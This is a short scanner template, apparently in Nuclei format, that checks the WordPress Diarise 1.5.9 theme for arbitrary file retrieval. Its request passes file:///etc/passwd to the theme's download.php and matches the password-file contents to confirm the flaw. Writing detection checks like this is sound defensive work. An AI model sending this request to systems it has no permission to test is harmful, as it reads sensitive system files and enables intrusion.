id: diarise-theme-lfi
name: WordPress Diarise 1.5.9 - Arbitrary File Retrieval
severity: high
confidence: tentative
description: WordPress Diarise theme version 1.5.9 suffers from a local file retrieval vulnerability.
reference: CWE-98
tags:
- packetstorm
- wordpress
- wp-theme
- lfi
- vuln
requests:
- method: GET
  path: /wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
